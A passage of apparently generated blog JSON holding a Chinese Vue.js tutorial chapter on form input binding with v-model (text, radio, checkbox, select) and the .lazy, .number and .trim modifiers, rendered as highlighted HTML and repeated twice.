class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;JS&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;&quot;</span>&gt;</span>JS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;HTML&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;checked&quot;</span>&gt;</span>已选：&#123;&#123; checked &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>下拉框(单选)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;selected&quot;</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>JS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">select</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;selected&quot;</span>&gt;</span>已选：&#123;&#123; selected &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>下拉框(多选)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;selected1&quot;</span> <span class=\"hljs-attr\">multiple</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>JS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">select</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;selected1&quot;</span>&gt;</span>已选：&#123;&#123; selected1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">text</span>:<span class=\"hljs-string\">&#x27;&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">text1</span>:<span class=\"hljs-string\">&#x27;&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">picked</span>:<span class=\"hljs-string\">&#x27;false&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">checked</span>:[<span class=\"hljs-string\">&#x27;&#x27;</span>],</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">selected</span>:<span class=\"hljs-string\">&#x27;&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">selected1</span>:[<span class=\"hljs-string\">&#x27;&#x27;</span>]</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">computed</span>:&#123;</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">methods</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleInput</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>)&#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">text1</span>=e.<span class=\"hljs-property\">target</span>.<span class=\"hljs-property\">value</span>;</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;)</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-2-绑定值\"><a href=\"#6-2-绑定值\" class=\"headerlink\" title=\"6.2 绑定值\"></a>6.2 绑定值</h3><p>选中显示a,未选中显示b</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>复选框：<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked2&quot;</span> <span class=\"hljs-attr\">:true-value</span>=<span class=\"hljs-string\">&quot;value1&quot;</span> <span class=\"hljs-attr\">:false-value</span>=<span class=\"hljs-string\">&quot;value2&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span>&gt;</span>复选框：<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>&#123;&#123; picked2 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Value1:&#123;&#123; value1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Value2:&#123;&#123; value2 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-3-修饰符\"><a href=\"#6-3-修饰符\" class=\"headerlink\" title=\"6.3 修饰符\"></a>6.3 修饰符</h3><p>​    1 v-model.lazy 显示数据不是实时改变，回车或者失焦才会改变；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>.lazy<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">v-model.lazy</span>=<span class=\"hljs-string\">&quot;lazy&quot;</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Lazy:&#123;&#123; lazy &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    2 v-model.number 将输入类型转换为Number类型，否则虽然输入的是数字，其实类型是字符串；若是输入字符，不显示；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>.numebr<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">v-model.number</span>=<span class=\"hljs-string\">&quot;number&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>number:&#123;&#123; number &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    3 v-model.trim 去除首尾空白；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>.trim<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">v-model.trim</span>=<span class=\"hljs-string\">&quot;trim&quot;</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>trim:&#123;&#123; trim &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span> <br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch6\"><a href=\"#Ch6\" class=\"headerlink\" title=\"Ch6\"></a>Ch6</h1><h3 id=\"6-1-表单基本用法及常用小组件\"><a href=\"#6-1-表单基本用法及常用小组件\" class=\"headerlink\" title=\"6.1 表单基本用法及常用小组件\"></a>6.1 表单基本用法及常用小组件</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>汉语非即时显示<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">textarea</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;输入&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">textarea</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Content1:&#123;&#123; text &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>      <br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>汉语即时显示<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> @<span class=\"hljs-attr\">input</span>=<span class=\"hljs-string\">&quot;handleInput&quot;</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">&quot;输入2&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Content1:&#123;&#123; text1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>单选框<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-comment\">&lt;!-- 单选框 --&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;radio&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;HTML&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;radio&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;JS&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;js&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>JavaScript<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;radio&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;CSS&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;css&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\">&quot;padding-left: 30px;&quot;</span>&gt;</span>Picked:&#123;&#123; picked &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br>        <span class=\"hljs-comment\">&lt;!-- 复选框 --&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>复选框<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;CSS&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;css&quot;</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;JS&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;&quot;</span>&gt;</span>JS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;checked&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;HTML&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;html&quot;</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;checked&quot;</span>&gt;</span>已选：&#123;&#123; checked &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>下拉框(单选)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;selected&quot;</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>JS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">select</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;selected&quot;</span>&gt;</span>已选：&#123;&#123; selected &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>下拉框(多选)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">select</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;selected1&quot;</span> <span class=\"hljs-attr\">multiple</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>HTML<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>JS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">option</span>&gt;</span>CSS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">option</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">select</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span> <span class=\"hljs-attr\">for</span>=<span class=\"hljs-string\">&quot;selected1&quot;</span>&gt;</span>已选：&#123;&#123; selected1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><br><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">text</span>:<span class=\"hljs-string\">&#x27;&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">text1</span>:<span class=\"hljs-string\">&#x27;&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">picked</span>:<span class=\"hljs-string\">&#x27;false&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">checked</span>:[<span class=\"hljs-string\">&#x27;&#x27;</span>],</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">selected</span>:<span class=\"hljs-string\">&#x27;&#x27;</span>,</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">selected1</span>:[<span class=\"hljs-string\">&#x27;&#x27;</span>]</span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">computed</span>:&#123;</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">            &#125;,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">methods</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">handleInput</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>)&#123;</span><br><span class=\"language-javascript\">                    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">text1</span>=e.<span class=\"hljs-property\">target</span>.<span class=\"hljs-property\">value</span>;</span><br><span class=\"language-javascript\">                &#125;</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;)</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-2-绑定值\"><a href=\"#6-2-绑定值\" class=\"headerlink\" title=\"6.2 绑定值\"></a>6.2 绑定值</h3><p>选中显示a,未选中显示b</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>复选框：<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;checkbox&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;picked2&quot;</span> <span class=\"hljs-attr\">:true-value</span>=<span class=\"hljs-string\">&quot;value1&quot;</span> <span class=\"hljs-attr\">:false-value</span>=<span class=\"hljs-string\">&quot;value2&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">label</span>&gt;</span>复选框：<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">label</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>&#123;&#123; picked2 &#125;&#125;<span 